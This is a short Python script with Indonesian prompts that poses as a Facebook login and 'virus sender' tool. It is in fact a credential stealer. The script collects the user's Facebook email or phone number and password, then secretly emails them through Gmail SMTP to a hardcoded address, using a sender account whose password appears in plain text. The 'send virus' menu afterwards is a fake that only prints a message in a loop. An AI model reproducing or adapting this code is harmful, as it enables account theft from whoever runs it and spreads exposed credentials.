import smtplib,os
#from colorama import init
#init()
os.system("clear")
print(' ')
print('\033[31m' + '-------------------------------' + '\033[0m')
print(' ')
print('\033[36m' + '|     Login Akun Facebook     |' + '\033[0m') 
print(' ')
nama = input('\033[35m' + "| Email/NoTlpn : ")
pas = input("| Password : ")
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
mail_content = nama
pas = pas
#The mail addresses and password
sender_address = 'sendpy637@gmail.com'
sender_pass = 'sendpy123321'
receiver_address = 'firdausrifa3@gmail.com'
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = mail_content#The subject line
#The body and the attachments for the mail
message.attach(MIMEText(pas, 'text'))
#Create SMTP session for sending the mail
session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
session.starttls() #enable security
session.login(sender_address, sender_pass) #login with mail_id and password
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print (' ')
print ('\033[0m' + '\033[32m' + '|       Login Sukses...         |' + '\033[0m')
print (' ')
print ('\033[31m' + '--------------------------------' + '\033[0m')
print (' ')
print ('\033[31m' + '--------------------------------' + '\033[0m')
print ('\033[36m' + '|       SCRIPT SEND VIRUS      |' + '\033[0m') 
print ('\033[31m' + '--------------------------------' + '\033[0m')
print (' ')
print ('\033[31m' + '--------------------------------' + '\033[0m')
print ('\033[32m' + '|  Pilih Virus : ')
print ('')
print ('\033[33m' + '|  1. Darkpy') 
print ('|  2. Brutalpy')
print ('|  3. Trojans' '\033[0m')
print (' ')
print ('\033[32m' + 'Contoh : Darkpy' + '\033[0m')
b = input('\033[35m' + 'Masukan Nama Virus : ' + '\033[0m')
print (' ')
print ('\033[31m' + '--------------------------------' + '\033[0m')
print (' ')
a = input('\033[35m' + 'Masukan Nomor HP : ' + '\033[0m')
i = 1;
while i < 10: 
  print ('\033[31m', 'Virus ', b, '\033[0m', '\033[33m', 'Sedang Dikirim Ke Nomor : ', a, '\033[0m')
